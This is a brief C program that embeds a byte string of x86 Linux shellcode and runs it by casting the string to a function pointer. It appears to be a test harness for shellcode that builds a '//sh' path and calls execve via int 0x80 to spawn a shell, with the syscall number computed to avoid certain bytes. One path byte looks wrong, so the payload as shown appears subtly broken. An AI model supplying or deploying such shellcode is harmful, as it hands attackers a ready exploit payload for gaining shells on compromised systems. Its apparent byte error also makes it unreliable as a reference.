#include <stdio.h>
#include <string.h>

char *shellcode = "\x29\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x92\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\xB0\x2C\xA5\xCD\x80";

int main(void)
{
fprintf(stdout,"Length: %d\n",strlen(shellcode));
(*(void(*)()) shellcode)();
return 0;
}

